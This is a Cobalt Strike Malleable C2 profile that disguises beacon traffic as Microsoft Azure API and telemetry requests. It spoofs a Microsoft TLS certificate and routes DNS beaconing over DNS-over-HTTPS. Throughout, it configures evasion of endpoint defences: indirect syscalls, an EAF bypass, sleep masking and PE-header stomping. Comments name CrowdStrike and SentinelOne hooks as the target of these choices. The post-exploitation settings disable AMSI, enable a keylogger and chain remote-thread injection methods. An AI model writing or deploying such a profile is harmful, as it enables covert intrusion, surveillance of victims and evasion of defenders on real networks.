# Malleable C2 Profile - Modified for CS 4.12+ / Beacon Booster compatible

# Various options

set sample_name "Microsoft Telemetry Agent";
set data_jitter "50"; # Append random-length string (up to data_jitter value) to http-get and http-post server output
set host_stage "false"; # Disabled - use stageless payloads only to prevent payload scraping
set tasks_max_size "104857600"; # 100MB - avoid task size errors on large downloads/uploads
set pipename "mojo_##_##_############_#############.##.#"; # Chrome-style IPC pipe name
set pipename_stager "TSQL_###";
set smb_frame_header "";
set ssh_banner "OpenSSH_8.9p1 Ubuntu-3ubuntu0.6";

set sleeptime "30000"; # default sleep in ms (30s)
set jitter "37"; # Sleep jitter (0-99%)

set ssh_pipename "postex_ssh_####";
set tcp_frame_header "";
set tcp_port "8443";

set headers_remove "";  # list of HTTP client headers to remove from beacon traffic

# Numeric value of a binary mask (11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8))
set steal_token_access_mask "11";

# The maximum size (in bytes) of proxy data to transfer via the communication channel at a check in.
set tasks_proxy_max_size "94371840";

# The maximum size (in bytes) of proxy data to transfer via the DNS communication channel at a check in.
set tasks_dns_proxy_max_size "71680";

# See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm
dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".stage.123456.";
    set dns_ttl "1";

    set beacon         "doc.bc.";
    set get_A          "doc.1a.";
    set get_AAAA       "doc.4a.";
    set get_TXT        "doc.tx.";
    set put_metadata   "doc.md.";
    set put_output     "doc.po.";

    # Use "ns_response" when a DNS server is responding to a target with "Server failure" errors.
    set ns_response "zero";

    # Use these options to egress DNS Beacons with "DNS Over HTTPS"
    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
        set doh_proxy_server   "";
        set doh_server         "cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }

}

# Defaults for ALL CS set server responses

http-config {
    set headers "Date, Server, Content-Length, Connection, Content-Type, x-ms-request-id, x-ms-correlation-id";
    header "Server" "Microsoft-HTTPAPI/2.0";
    header "Connection" "keep-alive";

    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US"; #Country
    set CN "*.azure.com"; # CN - set to match your target infrastructure
    set L "Redmond"; #Locality
    set OU "Cloud Services"; #Org unit
    set O "Microsoft Corporation"; #Org name
    set ST "WA"; #State
    set validity "365";

    # if using a valid cert, specify this, keystore = java keystore
    #set keystore "domain.store";
    #set password "mypassword";

}

#If you have code signing cert:
#code-signer {
#    set keystore "keystore.jks";
#    set password "password";
#    set alias    "server";
#    set timestamp "false";
#    set timestamp_url "set://timestamp.digicert.com";
#    set digest_algorithm "SHA256";
#}

http-stager {
    set uri_x86 "/common/discovery/keys";
    set uri_x64 "/common/oauth2/v2.0/keys";

    client {
        parameter "appid" "1950a258-227b-4e31";
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "x-ms-request-id" "d7e4a3c0-5b2f-4e8a-9c1d";
        output {
            prepend "{\"keys\":[{\"kty\":\"RSA\",\"use\":\"sig\",\"kid\":\"";
            append "\"}]}";
            print;
        }
    }
}

# This is used only in http-get and http-post and not during stage
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";

http-get {
    set uri "/subscriptions/resources";

    client {
        header "Accept" "application/json";
        header "x-ms-version" "2024-05-01";

        metadata {
            mask;
            base64url;
            prepend "x-]]ms-client-session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "x-ms-request-id" "a1b2c3d4-e5f6-7890-abcd";
        header "x-ms-correlation-id" "f0e1d2c3-b4a5-6789";

        output {
            mask;
            base64;
            prepend "{\"value\":[{\"id\":\"/subscriptions/\",\"properties\":{\"data\":\"";
            append "\"}}]}";
            print;
        }
    }
}

http-post {
    set uri "/api/operations";
    set verb "POST";

    set client_max_post_get_packet "4096";

    client {
        header "Content-Type" "application/json; charset=utf-8";
        header "x-ms-version" "2024-05-01";

        output {
            mask;
            base64url;
            uri-append;
        }

        id {
            mask;
            base64url;
            prepend "{\"operationId\":\"";
            append "\",\"status\":\"InProgress\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "x-ms-request-id" "b2c3d4e5-f6a7-8901-bcde";

        output {
            mask;
            base64;
            prepend "{\"status\":\"Succeeded\",\"properties\":{\"output\":\"";
            append "\"}}";
            print;
        }
    }
}

http-beacon {
    set library "winhttp";
    set data_required "true";
    set data_required_length "256-512";
}

stage {

    set checksum "0";          # The CheckSum value in Beacon's PE header
    set data_store_size "16";  # how many entries can be stored in Beacon Data Store

    set copy_pe_header         "true";           # copy Beacon to new memory location with its DLL headers
    set eaf_bypass             "true";           # enable PrependLoader to use Export Address Table Filtering bypass
    set rdll_loader            "PrependLoader";  # PrependLoader only as StompLoader is no longer supported.
    set rdll_use_syscalls      "true";           # Prepend loader should use indirect system calls when loading the Beacon payload.
    set rdll_use_driploading   "true";           # enable driploading in the Cobalt Strike built-in reflective loader.
    set rdll_dripload_delay    "100";            # set the amount of delay when using driploading. default is 100 milliseconds.

    # Beacon Booster note: transform-obfuscate and transform-x86/x64 prepend/append
    # are intentionally omitted. Beacon Booster UDRLs require an unmodified RAW DLL structure.
    # Obfuscation is handled by the Booster's UDRL and sleepmask instead.

    # The transform-x86 and transform-x64 blocks - only strrep allowed for Beacon Booster compatibility
    transform-x86 {
        strrep "ReflectiveLoader" "DoLegitStuff";
    }

    transform-x64 {
        # transform the x64 rDLL stage, same options as with x86
    }

    stringw "I am not Beacon";

    set allocator "VirtualAlloc";  # Required for rdll_use_driploading

    set cleanup "true";        # Ask Beacon to attempt to free memory associated with
                                # the Reflective DLL package that initialized it.

    set magic_pe "PE";  #Override PE marker with something else

    # Obfuscate the Reflective DLL's import table, overwrite unused header content,
    # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
    set obfuscate "true";

    # Obfuscate Beacon, in-memory, prior to sleeping
    set sleep_mask "true";

    # Supports: None, Direct, and Indirect. Superseded by beacon_gate
    set syscall_method "Indirect";

    # See: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-gate.htm
    # beacon_gate ignored when sleep_mask is set to false
    # Comms only: masks HTTP APIs via obfuscated calls.
    # Core APIs use syscall_method "Indirect" instead to bypass EDR hooks.
    # beacon_gate All would override indirect syscalls with obfuscated calls for Core APIs,
    # which gets caught by CrowdStrike/S1 hooks.
    beacon_gate {
      Comms;
    }

    # Use embedded function pointer hints to bootstrap Beacon agent without
    # walking kernel32 EAT
    set smartinject "false"; # Requires .stage.rdll_loader = StompLoader

    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after
    # it loads Beacon payload
    set stomppe "true";

    # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
    set userwx "false";

    # PE header cloning - see "petool", skipped for now
    set compile_time "14 Sep 2018 08:14:00";
    set entry_point "92145";

    #The Exported name of the Beacon DLL
    #set name "beacon.x64.dll";

    # set rich_header  # Using a valid rich header from a different executable is recommended

}

process-inject {

    # set how memory is allocated in a remote process
    # VirtualAllocEx or NtMapViewOfSection.
    # The NtMapViewOfSection option is for same-architecture injection only.
    # VirtualAllocEx is always used for cross-arch memory allocations.
    set allocator "VirtualAllocEx";
    set use_driploading   "true";          # enable driploading in the Cobalt Strike during process injection.
    set dripload_delay    "100";           # set the amount of delay when using driploading. default is 100 milliseconds.

    # shape the memory characteristics and content
    set min_alloc "16384";
    set startrwx "false"; # RW initial permissions - RWX is a major EDR flag
    set userwx "false";

    # set how memory is allocated in the current process for BOF content
    set bof_allocator "VirtualAlloc"; # VirtualAlloc | MapViewOfFile | HeapAlloc
    set bof_reuse_memory "true";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        # transform x64 injected content
    }

    # determine how to execute the injected code
    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        NtQueueApcThread-s;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    # control the temporary process we spawn to
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # change our post-ex output named pipe names...
    set pipename "msrpc_####, win\\msrpc_###";

    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

    # The thread_hint option allows multi-threaded post-ex DLLs to spawn
    # threads with a spoofed start address. Specify the thread hint as
    # "module!function+0x##" to specify the start address to spoof.
    # The optional 0x## part is an offset added to the start address.
    # set thread_hint "....TODO:FIXME"

    # options are: GetAsyncKeyState (def) or SetWindowsHookEx
    set keylogger "GetAsyncKeyState";

    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";

    transform-x64 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

    transform-x86 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

}
